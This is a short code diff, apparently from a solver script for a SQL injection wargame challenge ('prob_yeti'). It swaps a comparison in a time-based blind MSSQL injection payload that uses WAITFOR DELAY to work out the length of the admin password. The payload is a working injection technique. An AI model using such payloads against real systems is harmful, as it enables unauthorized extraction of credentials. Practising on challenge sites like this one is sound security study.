@@ -38,7 +38,7 @@ def main():
     final_response = ''
     while 'Clear!' not in final_response:
 
-        payload = "' if ((select len(pw) from prob_yeti where id='admin')>%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
+        payload = "' if ((select len(pw) from prob_yeti where id='admin')<%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
         p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
         len_of_key = p.find_key_len(check_func)
 
